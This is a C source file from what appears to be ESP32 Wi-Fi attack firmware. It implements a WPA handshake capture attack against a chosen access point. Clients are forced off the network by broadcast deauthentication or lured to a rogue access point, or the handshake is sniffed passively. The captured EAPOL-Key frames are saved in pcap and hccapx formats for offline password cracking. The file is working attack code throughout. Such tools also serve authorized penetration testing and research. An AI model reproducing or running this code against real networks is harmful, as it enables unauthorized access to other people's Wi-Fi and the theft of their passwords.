/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static bool pcap_active = false;
static bool analyzer_active = false;
static bool event_handler_registered = false;

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    if (!attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len) ||
        !pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len,
                                      frame->rx_ctrl.timestamp)) {
        ESP_LOGE(TAG, "Failed to store captured EAPOL frame");
        attack_signal_error();
        return;
    }
    hccapx_serializer_add_frame((data_frame_t *) frame->payload,
                                frame->rx_ctrl.sig_len);

    /* message_pair leaves 255 once a usable handshake is assembled, so the
       capture can stop by itself instead of waiting out the timeout. */
    hccapx_t *hccapx = hccapx_serializer_get();
    if (hccapx != NULL && hccapx->message_pair != 255) {
        ESP_LOGI(TAG, "Usable handshake captured (pair=%u)", hccapx->message_pair);
        attack_signal_success();
    }
}

bool attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    if (attack_config == NULL || attack_config->ap_record == NULL ||
        attack_config->ap_record->primary == 0 || attack_config->method > ATTACK_HANDSHAKE_METHOD_PASSIVE) {
        ESP_LOGE(TAG, "Invalid handshake attack configuration");
        return false;
    }
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    size_t ssid_len = strnlen((char *)ap_record->ssid, sizeof(ap_record->ssid));
    if (!pcap_serializer_init(ap_record->ssid, ssid_len)) {
        ESP_LOGE(TAG, "PCAP capture could not be initialized");
        return false;
    }
    pcap_active = true;
    hccapx_serializer_init(ap_record->ssid, ssid_len);
    wifictl_sniffer_filter_frame_types(true, false, false);
    if (!frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid)) {
        ESP_LOGE(TAG, "Failed to start handshake frame analysis");
        return false;
    }
    analyzer_active = true;
    esp_err_t err = esp_event_handler_register_with(
        wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register handshake handler: %s", esp_err_to_name(err));
        return false;
    }
    event_handler_registered = true;
    if (!wifictl_sniffer_start(ap_record->primary)) {
        ESP_LOGE(TAG, "Failed to start sniffer");
        return false;
    }
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            if (!attack_method_broadcast(ap_record, 500)) return false;
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            if (!attack_method_rogueap(ap_record)) return false;
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
    return true;
}

bool attack_handshake_stop(void){
    bool ok = true;
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
        default:
            break;
    }
    if (wifictl_sniffer_is_active()) wifictl_sniffer_stop();
    if (analyzer_active) frame_analyzer_capture_stop();
    analyzer_active = false;
    if (event_handler_registered) {
        esp_err_t err = esp_event_handler_unregister_with(
            wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS,
            DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
        if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
            ESP_LOGW(TAG, "Failed to unregister handshake handler: %s", esp_err_to_name(err));
            ok = false;
        }
        event_handler_registered = false;
    }
    ok = wifictl_mgmt_ap_restore() && ok;
    if (pcap_active && !pcap_serializer_deinit()) {
        ESP_LOGE(TAG, "Failed to finalize PCAP capture");
        ok = false;
    }
    pcap_active = false;
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
    return ok;
}
